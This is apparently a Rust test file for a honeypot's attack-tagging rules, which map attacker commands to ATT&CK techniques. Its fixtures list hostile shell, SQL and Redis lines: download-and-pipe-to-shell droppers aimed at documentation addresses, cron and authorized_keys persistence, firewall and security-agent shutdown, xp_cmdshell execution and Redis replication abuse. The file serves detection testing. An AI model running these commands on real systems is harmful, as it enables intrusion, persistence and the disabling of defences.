//! The rules against positive and negative lines. Every rule has lines it must match and lines
//! that look like it and must not: the technique's word as an argument or inside a URL, a read
//! where the rule needs a write, a listing where it needs an install. Addresses are RFC 5737.

use std::collections::BTreeSet;

use super::*;
use crate::ioc;

/// The ids of the rules that match `sample`, read as the evidence the rule's scope names.
fn fired(scope: Scope, sample: &str) -> Vec<&'static str> {
    let matches = match scope {
        // Read in every dialect, so a negative must hold in all three.
        Scope::Sql => ["postgresql", "mysql", "mssql"]
            .iter()
            .flat_map(|sensor| tag_sql(sensor, sample))
            .collect(),
        Scope::Redis => tag_redis(&redis_metadata(sample)),
        Scope::Command => tag_command(sample),
        Scope::Download => tag_download(Some(sample), None),
        Scope::Upload => tag_upload(sample),
        Scope::Signal => tag_signal(sample),
        Scope::Indicator => tag_indicators(&ioc::extract_from_command(sample)),
    };
    matches.into_iter().map(|m| m.rule).collect()
}

/// The metadata the redis sensor records for a command typed as words: `CONFIG SET param value`
/// carries `param` and `value`, any other command its words after the name as `args`.
fn redis_metadata(line: &str) -> serde_json::Value {
    let words: Vec<&str> = line.split_whitespace().collect();
    if words.len() >= 2 && words[..2].join(" ").eq_ignore_ascii_case("CONFIG SET") {
        serde_json::json!({
            "command": "CONFIG SET",
            "param": words.get(2),
            "value": words.get(3),
        })
    } else {
        serde_json::json!({ "command": words.first(), "args": words.get(1..) })
    }
}

const SHA: &str = "ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12";

/// `(rule, lines the rule must match)`.
const POSITIVE: &[(&str, &[&str])] = &[
    ("brute-force-signal", &["ssh_brute_force"]),
    ("download-event", &["http://198.51.100.7/bins/x86"]),
    (
        "download-command",
        &[
            "wget http://198.51.100.7/x",
            "busybox wget http://198.51.100.7/x -O /tmp/x",
            "cd /tmp; curl -s http://198.51.100.7/a",
            "curl -sL https://203.0.113.5/a.sh | bash",
            "tftp -g -r x86 198.51.100.7",
            "ftpget -v -u a -p b 198.51.100.7 f f",
            "sudo wget http://198.51.100.7/x",
        ],
    ),
    ("upload-sample", &[SHA]),
    (
        "unix-shell",
        &[
            "sh",
            "sh -c 'ls'",
            "wget -O- http://198.51.100.7/x | sh",
            "busybox sh",
            "bash x.sh",
            "/bin/bash -c id",
        ],
    ),
    (
        "cron-install",
        &[
            "crontab -",
            "(crontab -l; echo '@reboot /tmp/x') | crontab -",
            "echo '* * * * * /tmp/x' >> /etc/crontab",
            "echo x > /etc/cron.d/job",
            "cp x /etc/cron.hourly/x",
            "tee -a /var/spool/cron/root",
            "crontab mycron",
            "crontab -u root file",
            "sh -c \"echo '@daily /tmp/x' >> /etc/crontab\"",
        ],
    ),
    (
        "systemd-unit",
        &[
            "echo '[Service]' > /etc/systemd/system/x.service",
            "cp x.service /usr/lib/systemd/system/x.service",
            "systemctl enable x.service",
            "systemctl --user enable foo",
            "printf '[Service]' > ~/.config/systemd/user/w.service",
        ],
    ),
    (
        "rc-script",
        &[
            "echo '/tmp/x &' >> /etc/rc.local",
            "sed -i 's/exit 0/\\/tmp\\/x/' /etc/rc.local",
            "cp x /etc/rc.d/rc.local",
            "tee /etc/rc.common",
            "echo x > /etc/rc.local.d/local.sh",
        ],
    ),
    (
        "authorized-keys",
        &[
            "echo ssh-rsa AAAA >> ~/.ssh/authorized_keys",
            "cat k >> /root/.ssh/authorized_keys",
            "cp k /home/u/.ssh/authorized_keys",
            "tee -a .ssh/authorized_keys",
            "echo k > .ssh/authorized_keys2",
            "dd if=k of=/root/.ssh/authorized_keys",
        ],
    ),
    (
        "system-info",
        &[
            "uname -a",
            "nproc",
            "lscpu",
            "cat /proc/cpuinfo",
            "cat /proc/cpuinfo | grep name | wc -l",
            "grep -c processor /proc/cpuinfo",
            "head -n1 /etc/os-release",
            "cat < /proc/meminfo",
            "echo $(uname -m)",
        ],
    ),
    (
        "file-discovery",
        &[
            "ls",
            "ls -la /tmp",
            "find / -name x",
            "/bin/ls",
            "cd /tmp; ls",
        ],
    ),
    (
        "process-discovery",
        &[
            "ps",
            "ps aux | grep x",
            "top -bn1",
            "pidof sshd",
            "busybox ps",
        ],
    ),
    (
        "permissions",
        &[
            "chmod 777 x",
            "chmod +x /tmp/x",
            "chown root x",
            "chmod -R 755 /tmp/d",
        ],
    ),
    (
        "file-deletion",
        &["rm -rf /tmp/x", "rm x", "unlink /tmp/a", "shred -u f"],
    ),
    (
        "miner-script",
        &["wget https://coinhive.com/lib/coinhive.min.js"],
    ),
    (
        "miner-configured",
        &["echo 'CoinHive.Anonymous(\"fixture-key\")'"],
    ),
    (
        "firewall-disable",
        &[
            "iptables -F",
            "iptables -t nat -F",
            "ip6tables --flush",
            "nft flush ruleset",
            "ufw disable",
            "systemctl stop firewalld",
            "service iptables stop",
            "/etc/init.d/iptables stop",
            "systemctl disable --now ufw.service",
        ],
    ),
    (
        "security-tool-kill",
        &[
            "pkill auditd",
            "killall -9 aegis",
            "pkill -f AliYunDun",
            "systemctl stop auditd",
            "service cloudmonitor stop",
            "systemctl disable --now fail2ban",
            "/etc/init.d/aegis stop",
        ],
    ),
    (
        "sql-account-password",
        &[
            "ALTER USER app WITH PASSWORD 'fixture-pw-1'",
            "alter role app password 'fixture-pw-1'",
            "ALTER USER app PASSWORD NULL",
            "ALTER LOGIN sa WITH PASSWORD = 'fixture-pw-1'",
            "ALTER USER 'app'@'%' IDENTIFIED BY 'fixture-pw-1'",
            "SET PASSWORD FOR app = 'fixture-pw-1'",
            "EXEC sp_password NULL, 'fixture-pw-1', 'sa'",
            "SELECT version(); ALTER USER app WITH ENCRYPTED PASSWORD 'fixture-pw-1'",
            "ALTER/**/USER app PASSWORD 'fixture-pw-1'",
        ],
    ),
    (
        "sql-privilege-change",
        &[
            "GRANT ALL PRIVILEGES ON DATABASE d TO app",
            "grant pg_read_server_files to app",
            "GRANT SELECT ON t TO PUBLIC",
            "ALTER USER app WITH SUPERUSER",
            "ALTER ROLE app SUPERUSER LOGIN",
            "EXEC sp_addsrvrolemember 'app', 'sysadmin'",
            "exec master..sp_addrolemember 'db_owner', 'app'",
            "ALTER SERVER ROLE sysadmin ADD MEMBER app",
        ],
    ),
    (
        "sql-account-create",
        &[
            "CREATE USER app WITH PASSWORD 'fixture-pw-1'",
            "create user 'app'@'%' identified by 'fixture-pw-1'",
            "CREATE OR REPLACE USER app",
            "CREATE ROLE app LOGIN",
            "CREATE ROLE app WITH SUPERUSER LOGIN",
            "CREATE LOGIN app WITH PASSWORD = 'fixture-pw-1'",
            "exec sp_addlogin 'app', 'fixture-pw-1'",
        ],
    ),
    (
        "sql-os-command",
        &[
            "COPY t FROM PROGRAM 'id'",
            "copy (select 1) to program 'curl http://198.51.100.7/x | sh'",
            "EXEC xp_cmdshell 'whoami'",
            "exec master..xp_cmdshell 'dir'",
            "SELECT 1; EXEC/**/xp_cmdshell 'id'",
            "EXEC sp_configure 'xp_cmdshell', 1",
            "SELECT sys_exec('id')",
            "select SYS_EVAL('id')",
            "CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'",
        ],
    ),
    (
        "sql-version-discovery",
        &[
            "SELECT version();",
            "select VERSION ( )",
            "SELECT 1; select version()",
            "SELECT/**/version()",
            "SELECT @@version",
            "select @@VERSION_COMMENT",
            "SHOW server_version",
        ],
    ),
    (
        "sql-user-discovery",
        &[
            "SELECT current_user",
            "select CURRENT_USER;",
            "select session_user, current_database()",
            "SELECT 1, current_user FROM dual",
            "SELECT user",
            "SELECT user()",
            "SELECT system_user",
            "SELECT suser_name()",
            "SELECT USER_NAME ()",
        ],
    ),
    (
        "sql-file-read",
        &[
            "SELECT pg_read_file('/etc/passwd')",
            "select pg_read_binary_file('/etc/passwd')",
            "SELECT lo_import('/etc/passwd')",
            "SELECT/**/lo_import ('/etc/passwd')",
            "SELECT LOAD_FILE('/etc/passwd')",
            "COPY t FROM '/etc/passwd'",
            "LOAD DATA INFILE '/etc/passwd' INTO TABLE t",
            "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t",
            "SELECT * FROM OPENROWSET(BULK 'C:/x.txt', SINGLE_CLOB) AS a",
        ],
    ),
    (
        "redis-config-cron",
        &[
            "CONFIG SET dir /var/spool/cron",
            "config set dir /var/spool/cron/crontabs/",
            "CONFIG SET DIR /etc/cron.d",
            "CONFIG SET dir /etc/cron.hourly/x",
        ],
    ),
    (
        "redis-config-authkeys",
        &[
            "CONFIG SET dir /root/.ssh",
            "CONFIG SET dir /home/u/.ssh/",
            "CONFIG SET dbfilename authorized_keys",
            "config set dbfilename authorized_keys2",
            "CONFIG SET dbfilename /root/.ssh/authorized_keys",
        ],
    ),
    (
        "redis-replicaof",
        &[
            "SLAVEOF 198.51.100.7 6379",
            "replicaof 203.0.113.9 6379",
            "REPLICAOF 198.51.100.7",
        ],
    ),
];

/// `(rule, lines that look like the rule and must not match it)`.
const NEGATIVE: &[(&str, &[&str])] = &[
    (
        "brute-force-signal",
        &[
            "honeypot_login_attempt",
            "remote_auth_failure",
            "ssh_brute_forcer",
        ],
    ),
    ("download-event", &[""]),
    (
        "download-command",
        &[
            "echo wget http://198.51.100.7/x",
            "curl --upload-file /etc/passwd http://198.51.100.7/",
            "curl -d @/etc/passwd http://198.51.100.7/",
            "wget",
            "curl localhost",
            "tftp 198.51.100.7",
            "ftpget",
            "ftpget -v",
            "ls wget.sh",
            "cat curl http://198.51.100.7/x",
        ],
    ),
    ("upload-sample", &[]),
    (
        "unix-shell",
        &[
            "echo sh",
            "ls /bin/sh",
            "wget http://198.51.100.7/sh",
            "cat bash",
            "echo bash -c id",
            "shred x",
        ],
    ),
    (
        "cron-install",
        &[
            "echo crontab",
            "crontab -l",
            "crontab -r",
            "crontab -e",
            // A listing, removal or edit flag wins over a stray operand.
            "crontab -l mycron",
            "crontab -r -",
            "crontab -u root -l",
            "crontab",
            "cat /etc/crontab",
            "ls /etc/cron.d",
            "wget http://198.51.100.7/cron/crontab.sh",
            "echo hi > /tmp/cron.d/x",
            "grep cron /etc/crontab",
            "echo /etc/crontab",
            "cd /etc/cron.d",
            "echo '/etc/cron.d/x'",
        ],
    ),
    (
        "systemd-unit",
        &[
            "systemctl status x",
            "systemctl start x",
            "systemctl enable",
            "cat /etc/systemd/system/x.service",
            "echo systemctl enable x",
            "echo x > /etc/systemd/system/x.conf",
            "echo x > /etc/systemd/system/backup.timer",
            "echo x > /tmp/x.service",
            "echo x > /etc/systemd/system/.service",
        ],
    ),
    (
        "rc-script",
        &[
            "cat /etc/rc.local",
            "ls /etc/init.d",
            "echo x >> /etc/init.d/foo",
            "echo x > /tmp/rc.local",
            "echo rc.local",
            "grep exit /etc/rc.local",
            "sed 's/exit 0/x/' /etc/rc.local",
            "sed -n p /etc/rc.local",
            "dd if=/etc/rc.local of=/tmp/a",
            "echo x > /home/u/rc.local",
        ],
    ),
    (
        "authorized-keys",
        &[
            "cat ~/.ssh/authorized_keys",
            "ls .ssh/authorized_keys",
            "grep x /root/.ssh/authorized_keys",
            "echo authorized_keys",
            "echo k > /tmp/authorized_keys.bak",
            "cp ~/.ssh/authorized_keys /tmp/a",
            "wget http://198.51.100.7/authorized_keys",
        ],
    ),
    (
        "system-info",
        &[
            "echo uname",
            "echo /proc/cpuinfo",
            "ls /proc/cpuinfo",
            "cat /proc/net/dev",
            "wget http://198.51.100.7/uname",
            "cat uname",
            "echo x > /proc/cpuinfo",
        ],
    ),
    (
        "file-discovery",
        &[
            "echo ls",
            "wget http://198.51.100.7/ls",
            "cat ls",
            "cd /tmp/ls",
            "echo 'find / -name x'",
        ],
    ),
    (
        "process-discovery",
        &[
            "echo ps",
            "cat /tmp/ps",
            "wget http://198.51.100.7/ps.sh",
            "cd /proc/top",
        ],
    ),
    (
        "permissions",
        &[
            "chmod",
            "chmod -x",
            "echo chmod +x f",
            "ls chmod",
            "wget http://198.51.100.7/chmod",
            "cat chown",
        ],
    ),
    (
        "file-deletion",
        &[
            "rm",
            "rm -rf",
            "echo rm -rf /",
            "ls rm",
            "wget http://198.51.100.7/rm",
            "cat unlink",
        ],
    ),
    (
        "miner-script",
        &[
            "wget https://example.com/lib/coinhive.min.js",
            "wget https://evilcoinhive.com/lib/x.js",
            "echo coinhive.com",
        ],
    ),
    (
        "miner-configured",
        &[
            "echo CoinHive.Anonymous",
            "echo CoinHive.Other(1)",
            // Another credentials indicator is not a configured miner.
            "wget http://user:pw@198.51.100.7/x",
        ],
    ),
    (
        "firewall-disable",
        &[
            "iptables -L",
            "iptables -A INPUT -j ACCEPT",
            "echo iptables -F",
            "systemctl status firewalld",
            "systemctl stop nginx",
            "service ufw status",
            "ufw enable",
            "nft list ruleset",
            "wget http://198.51.100.7/iptables-F",
        ],
    ),
    (
        "security-tool-kill",
        &[
            "pkill sshd",
            "killall nginx",
            "echo pkill auditd",
            "systemctl status auditd",
            "ps | grep aegis",
            "cat /usr/local/aegis",
            "service nginx stop",
        ],
    ),
    (
        "sql-account-password",
        &[
            "ALTER USER app SET search_path = public",
            "ALTER USER app PASSWORD EXPIRE",
            "ALTER USER app RENAME TO password",
            "ALTER USER app VALID UNTIL 'infinity'",
            "ALTER TABLE users ALTER COLUMN password TYPE text",
            "SET password_encryption = 'scram-sha-256'",
            "SELECT 'ALTER USER app PASSWORD ''x'''",
            "SELECT password FROM users WHERE name = 'alter user'",
            "-- ALTER USER app PASSWORD 'x'",
            "/* ALTER USER app PASSWORD 'x' */ SELECT 1",
            "CREATE TABLE alter_user_password (id int)",
        ],
    ),
    (
        "sql-privilege-change",
        &[
            "REVOKE ALL ON t FROM app",
            "SELECT * FROM grants",
            "SELECT grant_date FROM t WHERE x = 'to'",
            "SELECT 'GRANT ALL TO x'",
            "-- GRANT ALL TO x",
            "GRANT SELECT ON t",
            "ALTER USER app NOSUPERUSER",
            "ALTER ROLE app SET superuser_reserved_connections = 1",
            "EXEC sp_helpsrvrolemember",
            "SELECT 'sp_addsrvrolemember'",
        ],
    ),
    (
        "sql-account-create",
        &[
            "CREATE USER MAPPING FOR app SERVER s",
            "CREATE ROLE grp",
            "CREATE ROLE app NOLOGIN",
            "CREATE TABLE users (id int)",
            "CREATE TABLE login (id int)",
            "CREATE INDEX user_idx ON t (a)",
            "DROP USER app",
            "SELECT 'CREATE USER x'",
            "EXEC sp_helplogins",
        ],
    ),
    (
        "sql-os-command",
        &[
            "COPY program FROM STDIN",
            "COPY t FROM STDIN",
            "COPY t FROM '/tmp/in.csv'",
            "SELECT program FROM jobs",
            "SELECT 'xp_cmdshell'",
            "SELECT * FROM xp_cmdshell_log",
            "SELECT \"xp_cmdshell\" FROM t",
            "SELECT sys_exec_count FROM t",
            "SELECT sys_exec FROM t",
            "-- xp_cmdshell",
            "EXEC sp_configure 'show advanced options', 1",
            "EXEC sp_who",
            "SELECT 'COPY t FROM PROGRAM ''id'''",
            "CREATE FUNCTION f() RETURNS int AS 'select 1' LANGUAGE sql",
        ],
    ),
    (
        "sql-version-discovery",
        &[
            "SELECT version FROM migrations",
            "SELECT * FROM versions",
            "SELECT version(1)",
            "SELECT 'version()'",
            "-- select version()",
            "SELECT @@versions",
            "SHOW server_version_num",
            "SELECT schema_version() ",
        ],
    ),
    (
        "sql-user-discovery",
        &[
            "SELECT user FROM mysql.user",
            "SELECT user, host FROM mysql.user",
            "SELECT user_name FROM accounts",
            "SELECT username FROM users",
            "SELECT * FROM t WHERE owner = current_user",
            "ALTER TABLE t OWNER TO current_user",
            "SELECT current_user_id FROM t",
            "SELECT 'current_user'",
            "-- select current_user",
        ],
    ),
    (
        "sql-file-read",
        &[
            "COPY t FROM STDIN",
            "COPY t FROM PROGRAM 'id'",
            "COPY t TO '/tmp/out'",
            "SELECT lo_export(1, '/tmp/x')",
            "SELECT * FROM t INTO OUTFILE '/tmp/o'",
            "SELECT pg_read_file FROM t",
            "SELECT * FROM pg_read_file_log",
            "SELECT load_file_count FROM t",
            "SELECT 'load_file(''/etc/passwd'')'",
            "-- LOAD DATA INFILE '/x'",
        ],
    ),
    (
        "redis-config-cron",
        &[
            "CONFIG SET dir /tmp",
            "CONFIG SET dir /etc/cron.d.bak",
            "CONFIG SET dir /var/spool/cronx",
            "CONFIG SET dir /home/u/etc/cron.d",
            "CONFIG SET dbfilename /etc/cron.d",
            "CONFIG SET dir",
            "SET dir /etc/cron.d",
        ],
    ),
    (
        "redis-config-authkeys",
        &[
            "CONFIG SET dir /root/.ssh2",
            "CONFIG SET dir /root/ssh",
            "CONFIG SET dir /tmp/x.ssh",
            "CONFIG SET dbfilename authorized_keys.bak",
            "CONFIG SET dbfilename dump.rdb",
            "SET dbfilename authorized_keys",
        ],
    ),
    (
        "redis-replicaof",
        &[
            "SLAVEOF NO ONE",
            "replicaof no one",
            "SLAVEOF",
            "SET replicaof 198.51.100.7",
            "CONFIG SET replicaof x",
        ],
    ),
];

fn scope_of(rule: &str) -> Scope {
    super::rule(rule).expect("rule in the table").scope
}

#[test]
fn every_rule_matches_its_positive_lines_with_the_right_technique() {
    for (rule_id, lines) in POSITIVE {
        let scope = scope_of(rule_id);
        assert!(!lines.is_empty(), "{rule_id} has no positive line");
        for line in *lines {
            assert!(
                fired(scope, line).contains(rule_id),
                "{rule_id} should match {line:?}, got {:?}",
                fired(scope, line)
            );
        }
    }
}

#[test]
fn no_rule_matches_the_lines_that_only_resemble_it() {
    for (rule_id, lines) in NEGATIVE {
        let scope = scope_of(rule_id);
        for line in *lines {
            assert!(
                !fired(scope, line).contains(rule_id),
                "{rule_id} must not match {line:?}"
            );
        }
    }
}

#[test]
fn the_fixtures_cover_exactly_the_rule_table() {
    let table: BTreeSet<&str> = RULES.iter().map(|r| r.id).collect();
    let positive: BTreeSet<&str> = POSITIVE.iter().map(|(r, _)| *r).collect();
    let negative: BTreeSet<&str> = NEGATIVE.iter().map(|(r, _)| *r).collect();
    assert_eq!(table.len(), RULES.len(), "rule ids are unique");
    assert_eq!(positive, table);
    assert_eq!(negative, table);
}

#[test]
fn every_rule_names_a_well_formed_technique() {
    for r in &RULES {
        let (id, sub) = match r.technique.split_once('.') {
            Some((i, s)) => (i, Some(s)),
            None => (r.technique, None),
        };
        assert!(
            id.len() == 5 && id.starts_with('T') && id[1..].bytes().all(|b| b.is_ascii_digit())
        );
        assert!(sub.is_none_or(|s| s.len() == 3 && s.bytes().all(|b| b.is_ascii_digit())));
        assert!(!r.technique_name.is_empty() && !r.condition.is_empty());
    }
}

#[test]
fn a_token_is_the_evidence_that_matched_not_the_line() {
    let m = tag_command("cd /tmp; wget http://198.51.100.7/x; chmod +x x; rm -f x");
    let token = |rule: &str| {
        m.iter()
            .find(|m| m.rule == rule)
            .map(|m| m.matched.as_str())
    };
    assert_eq!(token("download-command"), Some("http://198.51.100.7/x"));
    assert_eq!(token("permissions"), Some("chmod +x"));
    assert_eq!(token("file-deletion"), Some("rm x"));
    assert_eq!(token("file-discovery"), None);
    let cron = tag_command("echo '* * * * * /tmp/x' >> /etc/crontab");
    assert_eq!(
        cron.iter()
            .map(|m| (m.rule, m.matched.as_str()))
            .collect::<Vec<_>>(),
        [("cron-install", "/etc/crontab")]
    );
    assert_eq!(
        tag_download(None, Some("wget http://198.51.100.7/x"))
            .first()
            .map(|m| m.matched.as_str()),
        Some("wget")
    );
}

#[test]
fn a_dropper_chain_is_tagged_by_what_it_runs_and_not_by_what_it_names() {
    let ids = |line: &str| -> BTreeSet<&'static str> {
        tag_command(line).into_iter().map(|m| m.rule).collect()
    };
    assert_eq!(
        ids(
            "cd /tmp; wget http://198.51.100.7/cron.sh; chmod +x cron.sh; ./cron.sh; rm -f cron.sh"
        ),
        BTreeSet::from(["download-command", "permissions", "file-deletion"])
    );
    assert_eq!(
        ids("echo crontab uname rm chmod wget http://198.51.100.7/x"),
        BTreeSet::new()
    );
    assert_eq!(
        ids("sh -c 'uname -a; ps'"),
        BTreeSet::from(["unix-shell", "system-info", "process-discovery"])
    );
}

#[test]
fn credentials_in_a_matched_url_are_redacted() {
    let m = tag_command("wget http://admin:hunter2@198.51.100.7/x");
    let url = m.iter().find(|m| m.rule == "download-command").unwrap();
    assert!(!url.matched.contains("hunter2"), "{url:?}");
    let d = tag_download(Some("http://admin:hunter2@198.51.100.7/x"), None);
    assert!(!d[0].matched.contains("hunter2"), "{d:?}");
}

fn sql_tokens(sensor: &str, sql: &str) -> Vec<(&'static str, String)> {
    tag_sql(sensor, sql)
        .into_iter()
        .map(|m| (m.rule, m.matched))
        .collect()
}

#[test]
fn a_sql_token_is_the_keyword_that_matched_and_never_a_literal() {
    // The live cred-pg pair: a version probe, then a password change.
    assert_eq!(
        sql_tokens(
            "postgresql",
            "SELECT version(); ALTER USER fixture_acct WITH PASSWORD 'fixture-secret-9'"
        ),
        [
            ("sql-account-password", "ALTER USER PASSWORD".to_string()),
            ("sql-version-discovery", "version()".to_string()),
        ]
    );
    let lines = [
        "ALTER USER fixture_acct PASSWORD 'fixture-secret-9'",
        "ALTER USER 'fixture_acct'@'%' IDENTIFIED BY 'fixture-secret-9'",
        "CREATE USER fixture_acct WITH PASSWORD 'fixture-secret-9'",
        "EXEC sp_addlogin 'fixture_acct', 'fixture-secret-9'",
        "SET PASSWORD FOR fixture_acct = 'fixture-secret-9'",
        "COPY t FROM PROGRAM 'echo fixture-secret-9'",
        "SELECT pg_read_file('/home/fixture-secret-9/key')",
        "SELECT sys_exec('echo fixture-secret-9')",
        "GRANT ALL ON fixture-secret-9 TO fixture_acct",
    ];
    for line in lines {
        let hits = sql_tokens("postgresql", line);
        assert!(!hits.is_empty(), "{line:?} should be tagged");
        for (rule, token) in hits {
            assert!(
                !token.contains("fixture-secret") && !token.contains("fixture_acct"),
                "{rule} stored {token:?} for {line:?}"
            );
        }
    }
}

#[test]
fn the_dialect_of_the_sensor_decides_what_is_code() {
    // In MySQL a backslash escapes the quote, so the string runs to the last quote and the
    // CREATE USER is inside it; PostgreSQL ends the string at the backslash-quote.
    let line = "SELECT 'a\\'; CREATE USER fixture_acct; SELECT 'b'";
    assert_eq!(sql_tokens("mysql", line), []);
    assert_eq!(
        sql_tokens("postgresql", line),
        [("sql-account-create", "CREATE USER".to_string())]
    );
    // A MySQL executable comment runs; elsewhere it is a comment.
    let hidden = "SELECT /*!50000 sys_exec*/('id')";
    assert_eq!(
        sql_tokens("mysql", hidden),
        [("sql-os-command", "sys_exec".to_string())]
    );
    assert_eq!(sql_tokens("postgresql", hidden), []);
    // PostgreSQL dollar quotes hide a statement boundary and the statement after it.
    let dollar = "SELECT $$; CREATE USER x; $$";
    assert_eq!(sql_tokens("postgresql", dollar), []);
}

#[test]
fn a_statement_after_the_first_is_read_and_other_sensors_are_not_read_as_sql() {
    let multi = "SELECT 1; SELECT 2; EXEC xp_cmdshell 'id'";
    assert_eq!(
        sql_tokens("mssql", multi),
        [("sql-os-command", "xp_cmdshell".to_string())]
    );
    let meta = serde_json::json!({ "command": "ALTER USER a PASSWORD 'x'" });
    for sensor in ["ssh", "telnet", "http", "smtp", "adb", "mongodb", ""] {
        assert!(
            tag_database_command(sensor, "ALTER USER a PASSWORD 'x'", &meta).is_empty(),
            "{sensor} is not a database sensor"
        );
    }
    assert_eq!(
        tag_database_command("postgresql", "ALTER USER a PASSWORD 'x'", &meta).len(),
        1
    );
    // Shell words are not SQL, and SQL is not a shell line.
    assert!(tag_sql("postgresql", "wget http://198.51.100.7/x; chmod +x x").is_empty());
    assert!(tag_command("SELECT version();").is_empty());
    // The redis sensor is read from its fields, not from its command name.
    let cfg =
        serde_json::json!({ "command": "CONFIG SET", "param": "dir", "value": "/etc/cron.d" });
    let hits = tag_database_command("redis", "CONFIG SET", &cfg);
    assert_eq!(
        hits.iter()
            .map(|m| (m.rule, m.matched.as_str()))
            .collect::<Vec<_>>(),
        [("redis-config-cron", "CONFIG SET dir")]
    );
    assert!(tag_database_command("postgresql", "CONFIG SET", &cfg).is_empty());
    // Only CONFIG SET carries a param and value that mean a save target; the same fields under
    // another command name (or a case variant of the right one) are read accordingly.
    let other = serde_json::json!({ "command": "SET", "param": "dir", "value": "/etc/cron.d" });
    assert!(tag_redis(&other).is_empty());
    let lower =
        serde_json::json!({ "command": "config set", "param": "DIR", "value": "/etc/cron.d" });
    assert_eq!(tag_redis(&lower).len(), 1);
}

/// `docs/reference/attack-tagging.md` owns the human-readable rule list: one row per rule id, each
/// naming the rule's technique id, and the matrix version it states is the one in code.
#[test]
fn the_reference_page_lists_exactly_the_rule_table() {
    let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../docs/reference/attack-tagging.md");
    let doc = std::fs::read_to_string(path).expect("reference page");
    let mut rows: Vec<(String, String)> = Vec::new();
    let rules = doc
        .split("\n## Rules\n")
        .nth(1)
        .and_then(|s| s.split("\n## ").next())
        .expect("a Rules section");
    for line in rules.lines().filter(|l| l.starts_with("| `")) {
        let cells: Vec<&str> = line.split('|').map(str::trim).collect();
        let id = cells[1].trim_matches('`').to_string();
        let technique = cells[2]
            .split_whitespace()
            .next()
            .unwrap_or_default()
            .to_string();
        rows.push((id, technique));
    }
    let table: Vec<(String, String)> = RULES
        .iter()
        .map(|r| (r.id.to_string(), r.technique.to_string()))
        .collect();
    assert_eq!(rows, table);
    assert!(
        doc.contains(&format!("**{MATRIX_VERSION}**")),
        "the page names the matrix version"
    );
}

#[test]
fn a_matched_token_is_bounded_and_one_line() {
    let long = format!("wget http://198.51.100.7/{}\nx", "a".repeat(2000));
    for m in tag_command(&long) {
        assert!(m.matched.len() <= MAX_MATCHED_BYTES && !m.matched.contains('\n'));
    }
}
